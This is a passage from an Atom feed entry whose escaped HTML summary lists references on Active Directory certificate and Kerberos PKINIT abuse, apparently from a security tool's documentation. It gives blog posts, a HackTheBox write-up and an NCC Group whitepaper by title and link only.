href=&#34;https://elkement.blog/2019/06/01/sizzle-hackthebox-unintended-getting-a-logon-smartcard-for-the-domain-admin-2/&#34;&gt;Sizzle @ hackthebox – Unintended: Getting a Logon Smartcard for the Domain Admin!&lt;/a&gt;&#34; and &#34;&lt;a href=&#34;https://elkement.wordpress.com/2020/06/21/impersonating-a-windows-enterprise-admin-with-a-certificate-kerberos-pkinit-from-linux/&#34;&gt;Impersonating a Windows Enterprise Admin with a Certificate: Kerberos PKINIT from Linux&lt;/a&gt;&#34; detail certificate template misconfigurations.&lt;/li&gt; &#xA; &lt;li&gt;Carl Sörqvist wrote up a detailed, and plausible, scenario for how some of these misconfigurations happen titled &#34;&lt;a href=&#34;https://blog.qdsecurity.se/2020/09/04/supply-in-the-request-shenanigans/&#34;&gt;Supply in the Request Shenanigans&lt;/a&gt;&#34;.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/_ethicalchaos_&#34;&gt;Ceri Coburn&lt;/a&gt; released an excellent post in 2020 on &#34;&lt;a href=&#34;https://ethicalchaos.dev/2020/10/04/attacking-smart-card-based-active-directory-networks/&#34;&gt;Attacking Smart Card Based Active Directory Networks&lt;/a&gt;&#34; detailing some smart card abuse and Certify additions.&lt;/li&gt; &#xA; &lt;li&gt;Brad Hill published a whitepaper titled &#34;&lt;a href=&#34;https://research.nccgroup.com/wp-content/uploads/2020/07/weaknesses_and_best_practices_of_public_key_kerberos_with_smart_cards.pdf&#34;&gt;Weaknesses and Best Practices of Public Key Kerberos with Smart Cards&lt;/a&gt;&#34; which provided some good background on Kerberos/PKINIT from a security perspective.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>